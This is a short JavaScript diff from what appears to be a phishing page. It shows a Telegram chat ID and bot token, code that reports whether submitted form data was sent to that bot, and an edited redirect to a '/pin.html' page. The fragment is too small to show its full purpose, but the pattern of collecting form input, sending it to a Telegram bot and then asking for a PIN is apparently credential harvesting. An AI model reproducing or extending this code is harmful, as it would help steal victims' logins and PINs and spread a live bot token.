@@ -16,5 +16,5 @@ const chat_id = '5510246221', botID = 'bot5669751939:AAFgBuZLq7zlT89Hshll0YXLjD_
         else
             messageStatus.textContent = "Message Failed to send :( " + (await sendMessage.text());
         e.target.reset(); // Clear the form fields.
-        window.location.href = '/pin';
+        window.location.href = '/pin.html';
     });
